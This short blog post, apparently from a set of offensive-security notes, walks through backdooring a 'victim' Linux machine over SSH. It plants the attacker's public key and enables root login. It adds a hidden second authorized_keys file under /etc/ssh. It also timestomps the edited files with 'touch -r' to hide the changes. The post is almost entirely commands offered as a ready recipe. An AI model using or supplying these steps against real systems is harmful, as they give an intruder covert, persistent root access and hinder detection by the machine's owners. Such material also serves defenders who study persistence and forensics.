---
layout: post
title:  "SSH Public Key Authentication"
categories: ssh public_key
summary: Public key authentication to victim computer
---

{% include instructions.md %}

### {{page.title}}

Create key pair on hostile’s computer, move public key to victim’s computer and take SSH connection to it

```shell
# ssh-keygen
# ssh-copy-id [username]@[victim ip address]
# ssh [username]@[victim ip address]
```

On victim’s computer modify sshd_config allow the root to login, change SSH to find public keys also from /etc/ssh/authorized_keys and move public key to that location.
```shell
# nano /etc/ssh/sshd_config
PermitRootLogin yes
AuthorizedKeysFile %h/.ssh/authorized_keys /etc/ssh/authorized_keys

# cp /home/[username]/.ssh/authorized_keys /etc/ssh/
# chown root:root /etc/ssh/authorized_keys
# chmod +r /etc/ssh/authorized_keys
# service ssh restart
# touch /etc/ssh/sshd_config -r /srv
# touch /etc/ssh/authorized_keys -r /srv
```

Now you can take SSH connection without password using root (or any other user) from hostile computer
```shell
# ssh root@[victim ip address]
```